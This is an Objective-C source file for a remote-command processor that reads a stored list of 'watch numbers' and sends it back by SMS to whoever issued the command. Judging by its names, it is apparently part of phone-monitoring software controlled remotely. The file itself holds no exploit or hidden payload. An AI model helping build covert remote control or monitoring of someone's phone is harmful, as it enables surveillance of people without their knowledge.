
/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  QueryWatchNumberProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "QueryWatchNumberProcessor.h"
#import "PrefWatchList.h"
#import "Preference.h"

@interface QueryWatchNumberProcessor (PrivateAPI)
- (void) sendReplySMSWithResult: (NSString *) aResult; 
- (void) processQueryWatchNumber;
@end

@implementation QueryWatchNumberProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the QueryWatchNumberProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (QueryWatchNumberProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"QueryWatchNumberProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the QueryWatchNumberProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"QueryWatchNumberProcessor--->doProcessingCommand")
    [self processQueryWatchNumber];
}

#pragma mark QueryWatchNumberProcessor  PrivateAPI

/**
 - Method name: processQueryWatchNumber
 - Purpose:This method is used to process query watch number
 - Argument list and description: No Return Type
 - Return description: mRemoteCmdCode (NSString *)
*/

- (void) processQueryWatchNumber {
	DLog (@"QueryWatchNumberProcessor--->processQueryWatchNumber")
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefWatchList *prefWatchList = (PrefWatchList *) [prefManager preference:kWatch_List];
	NSArray *watchNumberList=[prefWatchList mWatchNumbers];
	NSString *result=NSLocalizedString(@"kQueryWatchNumber", @"");
	for (NSString *watchNumber in watchNumberList) {
		result=[result stringByAppendingString:@"\n"];
		result=[result stringByAppendingString:watchNumber];
	}
	[self sendReplySMSWithResult:result];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aResult (NSString)
 - Return description: No return type
*/

- (void) sendReplySMSWithResult:(NSString *) aResult {
	DLog (@"QueryWatchNumberProcessor--->sendReplySMSWithResult")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *queryWatchNumberMessage=[NSString stringWithFormat:@"%@%@",messageFormat,aResult];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:queryWatchNumberMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:queryWatchNumberMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end
